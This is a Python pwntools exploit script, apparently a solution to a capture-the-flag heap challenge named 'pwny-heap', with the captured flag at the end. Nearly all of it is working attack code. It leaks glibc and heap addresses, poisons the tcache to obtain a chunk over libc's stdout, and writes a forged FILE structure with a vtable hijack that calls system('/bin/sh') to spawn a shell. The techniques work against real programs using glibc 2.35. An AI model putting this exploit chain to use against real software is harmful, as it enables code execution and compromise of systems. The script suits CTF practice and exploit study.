from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

gs='''
continue
'''

p = gdb.debug('./pwny-heap_patched', gdbscript=gs)

def malloc(index, size):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"index: ", b"%d" % index)
    p.sendlineafter(b"size: ", b"%d" % size)

def free(index):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"index: ", b"%d" % index)

def view(index):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"index: ", b"%d" % index)
    p.recvuntil(b": ")
    raw = p.recvuntil(b"1. ")[:-3]
    return raw

def write(index, data):
    p.sendlineafter(b"> ", b"4")
    p.sendlineafter(b"index: ", b"%d" % index)
    p.sendlineafter(b"write something in: ", b"%s" % data)

# Leak glibc base address
# Use fastbin attack: fill the tcache with 7 chunks and let the 8th chunk be in the unsorted bin
for i in range(9):
    malloc(i, 0xf8)
for i in range(8):
    free(i)
glibc_base_addr = u64(view(7).ljust(8, b"\x00"))-0x21ace0
log.info("GLIBC BASE @ %s" % hex(glibc_base_addr))

# Leak heap base address
# Use normal decrypt safe-linking
heap_base_addr = ((u64(view(0).ljust(8, b"\x00"))<<12)^0)&~0xfff
log.info("HEAP BASE @ %s" % hex(heap_base_addr))

# Prepare for tcache poisoning
glibc_e = ELF("./libc-2.35.so")
malloc(10, 0xf8)
free(6)
write(10, p64((glibc_base_addr+glibc_e.symbols['_IO_2_1_stdout_'])^((heap_base_addr+0x8a0)>>12)))

# Perform tcache poisoning
malloc(11, 0xf8)
malloc(12, 0xf8)

# Perform FSOP on stdout
stdout = glibc_e.sym['_IO_2_1_stdout_']+glibc_base_addr
fake_vtable = glibc_e.sym['_IO_wfile_jumps']-0x18+glibc_base_addr
gadget = next(glibc_e.search(asm('add rdi, 0x10 ; jmp rcx')))+glibc_base_addr
fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end = glibc_e.sym['system']+glibc_base_addr
fake._IO_save_base = gadget
fake._IO_write_end = u64(b'/bin/sh\x00')
fake._lock = stdout+0x8*7
fake._codecvt = stdout + 0xb8
fake._wide_data =stdout+0x200
fake.unknown2 = p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)
write(12, fake)

p.interactive()

# MVM{pwnpope_is_mining_xmr_on_your_machine_for_the_vatican}
